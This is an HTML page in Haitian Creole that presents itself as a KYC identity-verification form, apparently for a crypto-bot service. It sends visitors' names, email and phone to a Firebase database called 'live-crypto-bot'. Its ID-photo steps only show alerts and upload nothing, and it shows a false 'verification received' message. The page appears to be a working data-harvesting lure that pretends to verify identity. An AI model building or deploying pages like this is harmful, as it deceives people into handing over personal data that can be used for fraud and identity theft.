<!DOCTYPE html>
<html lang="ht">
<head>
    <meta charset="UTF-8">
    <title>Verifikasyon KYC</title>
    <style>
        body { background: #060e1b; color: white; font-family: sans-serif; padding: 20px; }
        .container { max-width: 400px; margin: auto; }
        input { width: 100%; padding: 12px; margin: 8px 0; background: #112240; border: 1px solid #d4af37; border-radius: 8px; color: white; box-sizing: border-box; }
        button { width: 100%; padding: 15px; background: #d4af37; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
        .kyc-box { border: 1px dashed #d4af37; padding: 10px; margin: 5px 0; text-align: center; cursor: pointer; border-radius: 8px; }
        #loader { display: none; text-align: center; margin: 10px 0; }
        #message { display: none; text-align: center; color: #2ecc71; font-weight: bold; padding: 20px; }
    </style>
</head>
<body>

<div class="container" id="form-area">
    <h2>Enfòmasyon KYC</h2>
    <input type="text" id="lastName" placeholder="Siyati">
    <input type="text" id="firstName" placeholder="Non">
    <input type="email" id="email" placeholder="Email">
    <input type="tel" id="phone" placeholder="Nimewo telefòn">
    
    <div class="kyc-box" onclick="alert('Tanpri chwazi foto devan')">1. Foto Devan</div>
    <div class="kyc-box" onclick="alert('Tanpri chwazi foto dèyè')">2. Foto Dèyè</div>
    <div class="kyc-box" onclick="alert('Tanpri chwazi selfie ak kat la')">3. Selfie ak Kat</div>
    
    <button id="btnFinal">KONFIME</button>
    <div id="loader">🔄 Pwosesis an kour...</div>
</div>

<div id="message">
    <h2>Vérifikasyon resevwa! ✅</h2>
    <p>N ap revize enfòmasyon w yo. Sa pral pran 24h.</p>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
    
    const db = getDatabase(initializeApp({ databaseURL: "https://live-crypto-bot-default-rtdb.firebaseio.com" }));

    document.getElementById('btnFinal').onclick = async () => {
        const email = document.getElementById('email').value;
        const name = document.getElementById('firstName').value;

        // Entelijan: Tcheke si jaden yo vid
        if (!email.includes('@') || name === "") {
            alert("❌ Erè: Tanpri ranpli enfòmasyon yo kòrèkteman!");
            return;
        }

        document.getElementById('loader').style.display = "block";

        const data = {
            siyati: document.getElementById('lastName').value,
            non: name,
            email: email,
            phone: document.getElementById('phone').value,
            status: "An atant",
            timestamp: Date.now()
        };

        try {
            await set(ref(db, 'users/' + Date.now()), data);
            
            // Chanje paj la
            document.getElementById('form-area').style.display = "none";
            document.getElementById('message').style.display = "block";
            
            // Sove nan memwa navigatè a pou l pa wè fòm nan ankò
            localStorage.setItem('kycSubmitted', 'true');
        } catch (e) {
            alert("Erè koneksyon!");
            document.getElementById('loader').style.display = "none";
        }
    };

    // Si deja soumèt, kache fòm nan imedyatman
    if (localStorage.getItem('kycSubmitted') === 'true') {
        document.getElementById('form-area').style.display = "none";
        document.getElementById('message').style.display = "block";
    }
</script>
</body>
</html>
